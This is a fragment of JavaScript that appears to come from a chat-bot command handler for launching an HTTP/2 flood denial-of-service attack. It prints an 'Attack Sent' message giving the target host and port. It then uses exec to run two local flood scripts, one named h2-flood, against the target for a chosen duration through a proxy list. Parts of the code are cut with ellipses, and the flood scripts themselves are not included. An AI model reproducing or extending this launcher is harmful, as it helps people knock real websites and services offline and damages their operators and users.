...
╭━✧「 <b>H2-FLOOD Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const kadal = path.join(__dirname, `../lib/cache/h2-flood`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${kadal} ${target} ${duration} 64 16 proxy.txt`);
  },
};